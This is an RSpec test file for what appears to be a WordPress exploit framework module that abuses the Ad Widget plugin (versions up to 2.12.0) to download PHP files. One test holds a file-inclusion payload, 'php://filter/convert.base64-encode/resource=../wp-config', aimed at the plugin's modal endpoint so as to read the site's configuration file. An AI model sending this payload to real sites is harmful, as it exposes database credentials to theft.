# frozen_string_literal: true

require_relative '../../../spec_helper'
require 'modules'

describe Wpxf::Auxiliary::AdWidgetPhpFileDownload do
  let(:subject) { described_class.new }

  before :each, 'setup subject' do
    allow(subject).to receive(:check_plugin_version_from_readme)
  end

  it 'should return a {Wpxf::Module}' do
    expect(subject).to be_a Wpxf::Module
  end

  it 'should check the plugin version is <= 2.12.0' do
    subject.check
    expect(subject).to have_received(:check_plugin_version_from_readme)
      .with('ad-widget', '2.12.0')
      .exactly(1).times
  end

  it 'should require authentication' do
    expect(subject.requires_authentication).to be true
  end

  it 'should download files using the .php extension' do
    expect(subject.file_extension).to eql '.php'
  end

  it 'should configure the downloader url' do
    url_pattern = %r{wp-content/plugins/ad-widget/views/modal/index\.php$}
    expect(subject.downloader_url).to match(url_pattern)
  end

  it 'should use the base64 filter in the request params' do
    expected_step = 'php://filter/convert.base64-encode/resource=../wp-config'
    expect(subject.download_request_params['step']).to eql expected_step
  end

  it 'should decode and resave the file contents' do
    allow(subject).to receive(:downloaded_filename).and_return('dest.php')
    allow(File).to receive(:write)

    subject.validate_content('dGVzdA==')
    expect(File).to have_received(:write)
      .with('dest.php', 'test')
  end
end
